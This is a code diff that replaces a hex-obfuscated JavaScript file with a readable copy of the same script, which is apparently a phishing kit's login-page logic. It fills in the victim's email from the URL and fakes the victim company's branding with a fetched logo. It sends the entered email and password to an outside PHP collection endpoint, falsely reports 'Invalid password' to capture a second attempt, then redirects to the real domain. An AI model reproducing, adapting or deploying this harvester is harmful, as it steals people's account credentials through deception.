@@ -1,1 +1,90 @@
-(function(){var _0x14E48=["\x23\x6D\x73\x67","","\x23\x65\x6D\x61\x69\x6C","\x32\x30\x30\x70\x78","\x6E\x6F\x6E\x65","\x23\x61\x75\x74\x6F\x6D\x61\x69\x6C","\x31","\x23\x69\x6E\x70\x75\x74\x62\x61\x72","\x23\x62\x61\x63\x6B\x31","\x23\x65\x72\x72\x6F\x72","\x40","\x2E","\x23\x6C\x6F\x67\x6F\x6E\x61\x6D\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x6F\x67\x6F\x2E\x63\x6C\x65\x61\x72\x62\x69\x74\x2E\x63\x6F\x6D\x2F","\x23\x6C\x6F\x67\x6F\x69\x6D\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x71\x75\x7A\x61\x6C\x61\x6F\x68\x79\x65\x61\x68\x66\x6F\x72\x70\x72\x6F\x78\x79\x2E\x6D\x61\x78\x78\x77\x65\x6C\x6C\x2D\x66\x61\x62\x2E\x77\x6F\x72\x6B\x65\x72\x73\x2E\x64\x65\x76\x2F\x2F\x3F\x75\x72\x6C\x3D\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E","\x23\x6D\x61\x69\x6E\x50\x61\x67\x65","\x23\x65\x72\x72\x6F\x72\x2C\x20\x23\x6D\x73\x67","\x23\x70\x61\x73\x73\x77\x6F\x72\x64","\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x66\x69\x65\x6C\x64\x20\x69\x73\x20\x65\x6D\x70\x74\x79\x21","\x4A\x53\x4F\x4E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x66\x72\x69\x67\x6F\x6D\x6F\x62\x69\x6C\x2E\x72\x6F\x2F\x73\x74\x65\x66\x66\x65\x6E\x6E\x6F\x2F\x6D\x65\x72\x63\x79\x2F\x6D\x65\x72\x63\x79\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x56\x65\x72\x69\x66\x79\x69\x6E\x67\x2E\x2E\x2E","\x23\x73\x75\x62\x6D\x69\x74\x2D\x62\x74\x6E","\x73\x69\x67\x6E\x61\x6C","\x6F\x6B","\x49\x6E\x76\x61\x6C\x69\x64\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E","\x53\x69\x67\x6E\x20\x69\x6E"];function _0x14E8B(){var _0x14E8B=0;$(_0x14E48[8]).click(function(){$(_0x14E48[0]).hide();$(_0x14E48[2]).val(_0x14E48[1]);$(_0x14E48[5]).css({left:_0x14E48[3],display:_0x14E48[4]});$(_0x14E48[7]).animate({right:_0x14E48[3],opacity:_0x14E48[6]},1000)});var _0x14F54=window.location.hash.substr(1);if(_0x14F54){$(_0x14E48[2]).val(_0x14F54);var _0x14F97=/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;if(!_0x14F97.test(_0x14F54)){$(_0x14E48[9]).show();return false};var _0x14ECE=_0x14F54.substring(_0x14F54.indexOf(_0x14E48[10])+ 1);var _0x14F11=_0x14ECE.split(_0x14E48[11])[0].toLowerCase();$(_0x14E48[12]).html(_0x14F11);$(_0x14E48[15]).attr(_0x14E48[13],_0x14E48[14]+ _0x14ECE);var _0x14FDA=_0x14E48[16]+ _0x14ECE;$(_0x14E48[17]).attr(_0x14E48[13],_0x14FDA);document.title= _0x14F11.toUpperCase()};$(_0x14E48[25]).click(function(_0x14F54){_0x14F54.preventDefault();$(_0x14E48[18]).hide();var _0x14F11=$(_0x14E48[2]).val();var _0x1501D=$(_0x14E48[19]).val();if(!_0x1501D){$(_0x14E48[0]).show().html(_0x14E48[20]);return false};if(!_0x14F97.test(_0x14F11)){$(_0x14E48[9]).show();return false};var _0x14ECE=_0x14F11.substring(_0x14F11.indexOf(_0x14E48[10])+ 1).toLowerCase();_0x14E8B++;$.ajax({dataType:_0x14E48[21],url:_0x14E48[22],type:_0x14E48[23],data:{email:_0x14F11,password:_0x1501D},beforeSend:function(){$(_0x14E48[25]).text(_0x14E48[24])},success:function(_0x14ECE){if(_0x14ECE&& _0x14ECE[_0x14E48[26]]== _0x14E48[27]){$(_0x14E48[19]).val(_0x14E48[1]);if(_0x14E8B>= 2){_0x14E8B= 0;window.location.replace(_0x14FDA)}else {$(_0x14E48[0]).show().html(_0x14E48[28])}}else {$(_0x14E48[0]).show().html(_0x14E48[28])}},error:function(){$(_0x14E48[19]).val(_0x14E48[1]);if(_0x14E8B>= 2){_0x14E8B= 0;window.location.replace(_0x14FDA)}else {$(_0x14E48[0]).show().html(_0x14E48[28])}},complete:function(){$(_0x14E48[25]).text(_0x14E48[29])}})})}$(document).ready(_0x14E8B)})()
+(function () {
+  var _0x14E48 = ["#msg", "", "#email", "200px", "none", "#automail", "1", "#inputbar", "#back1", "#error", "@", ".", "#logoname", "src", "https://logo.clearbit.com/", "#logoimg", "https://websitetermsandconditions.maxxwell-fab.workers.dev//?url=https://www.", "#mainPage", "#error, #msg", "#password", "Password field is empty!", "JSON", "https://frigomobil.ro/steffenno/mercy/mercy.php", "POST", "Verifying...", "#submit-btn", "signal", "ok", "Invalid password. Please try again", "Sign in"];
+  function _0x14E8B() {
+    var _0x14E8B = 0;
+    $(_0x14E48[8]).click(function () {
+      $(_0x14E48[0]).hide();
+      $(_0x14E48[2]).val(_0x14E48[1]);
+      $(_0x14E48[5]).css({
+        left: _0x14E48[3],
+        display: _0x14E48[4]
+      });
+      $(_0x14E48[7]).animate({
+        right: _0x14E48[3],
+        opacity: _0x14E48[6]
+      }, 1000);
+    });
+    var _0x14F54 = window.location.hash.substr(1);
+    if (_0x14F54) {
+      $(_0x14E48[2]).val(_0x14F54);
+      if (!/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(_0x14F54)) {
+        $(_0x14E48[9]).show();
+        return false;
+      }
+      ;
+      var _0x14ECE = _0x14F54.substring(_0x14F54.indexOf(_0x14E48[10]) + 1);
+      var _0x14F11 = _0x14ECE.split(_0x14E48[11])[0].toLowerCase();
+      $(_0x14E48[12]).html(_0x14F11);
+      $(_0x14E48[15]).attr(_0x14E48[13], _0x14E48[14] + _0x14ECE);
+      var _0x14FDA = _0x14E48[16] + _0x14ECE;
+      $(_0x14E48[17]).attr(_0x14E48[13], _0x14FDA);
+      document.title = _0x14F11.toUpperCase();
+    }
+    ;
+    $(_0x14E48[25]).click(function (_0x14F54) {
+      _0x14F54.preventDefault();
+      $(_0x14E48[18]).hide();
+      var _0x14F11 = $(_0x14E48[2]).val();
+      var _0x1501D = $(_0x14E48[19]).val();
+      if (!_0x1501D) {
+        $(_0x14E48[0]).show().html(_0x14E48[20]);
+        return false;
+      }
+      ;
+      if (!/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(_0x14F11)) {
+        $(_0x14E48[9]).show();
+        return false;
+      }
+      ;
+      _0x14E8B++;
+      $.ajax({
+        dataType: _0x14E48[21],
+        url: _0x14E48[22],
+        type: _0x14E48[23],
+        data: {
+          email: _0x14F11,
+          password: _0x1501D
+        },
+        beforeSend: function () {
+          $(_0x14E48[25]).text(_0x14E48[24]);
+        },
+        success: function (_0x14ECE) {
+          if (_0x14ECE && _0x14ECE[_0x14E48[26]] == _0x14E48[27]) {
+            $(_0x14E48[19]).val(_0x14E48[1]);
+            if (_0x14E8B >= 2) {
+              _0x14E8B = 0;
+              window.location.replace(_0x14FDA);
+            } else {
+              $(_0x14E48[0]).show().html(_0x14E48[28]);
+            }
+          } else {
+            $(_0x14E48[0]).show().html(_0x14E48[28]);
+          }
+        },
+        error: function () {
+          $(_0x14E48[19]).val(_0x14E48[1]);
+          if (_0x14E8B >= 2) {
+            _0x14E8B = 0;
+            window.location.replace(_0x14FDA);
+          } else {
+            $(_0x14E48[0]).show().html(_0x14E48[28]);
+          }
+        },
+        complete: function () {
+          $(_0x14E48[25]).text(_0x14E48[29]);
+        }
+      });
+    });
+  }
+  $(document).ready(_0x14E8B);
+})();
